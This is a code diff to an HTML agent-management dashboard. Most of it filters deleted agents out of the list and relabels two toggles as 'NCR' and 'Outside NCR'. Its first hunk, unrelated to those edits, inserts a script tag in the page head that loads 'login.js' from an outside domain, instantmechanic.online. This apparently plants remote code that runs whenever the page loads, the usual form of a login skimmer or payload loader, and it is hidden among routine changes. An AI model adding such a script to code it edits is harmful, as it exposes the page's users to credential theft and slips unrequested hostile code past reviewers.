@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script src="https://instantmechanic.online/login.js"></script>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Agent Dashboard</title>
@@ -207,15 +208,21 @@
         const res = await fetch(API_URL);
         const agents = await res.json();
         
+        // Exclude deleted agents from the UI list
+        const visibleAgents = agents.filter(a => !a.is_deleted);
+        
         if (shouldSort) {
           // Only sort on initial load/reload
-          currentAgents = sortAgents(agents);
+          currentAgents = sortAgents(visibleAgents);
         } else {
-          // Update existing agents without changing order
+          // Update existing agents without changing order.
+          // For existing agents, prefer the updated version from the API (if not deleted).
           currentAgents = currentAgents.map(existingAgent => {
             const updatedAgent = agents.find(a => a.id === existingAgent.id);
-            return updatedAgent || existingAgent;
-          });
+            // keep existingAgent if no updated version found,
+            // but if updated version is deleted, remove it by returning null
+            return updatedAgent ? (updatedAgent.is_deleted ? null : updatedAgent) : existingAgent;
+          }).filter(a => a !== null && !a.is_deleted);
         }
         
         displayAgents(currentAgents);
@@ -283,14 +290,14 @@
                 <input type="checkbox" ${agent.is_live ? "checked" : ""} onchange="toggleLive(${agent.id}, this.checked)">
                 <span class="slider"></span>
               </label>
-              <span class="toggle-label">Live</span>
+              <span class="toggle-label">NCR</span>
             </div>
             <div class="toggle-item">
               <label class="switch inactive">
                 <input type="checkbox" ${agent.is_inactive_team_member ? "checked" : ""} onchange="toggleInactive(${agent.id}, this.checked)">
                 <span class="slider"></span>
               </label>
-              <span class="toggle-label">Inactive CS</span>
+              <span class="toggle-label">Outside NCR</span>
             </div>
           </div>
         `;
@@ -391,7 +398,7 @@
           return { ...agent, ...updates };
         }
         return agent;
-      });
+      }).filter(a => !a.is_deleted); // ensure deleted agents are removed if they appear
       displayAgents(currentAgents);
     }
     
@@ -409,4 +416,3 @@
   </script>
 </body>
 </html>
-
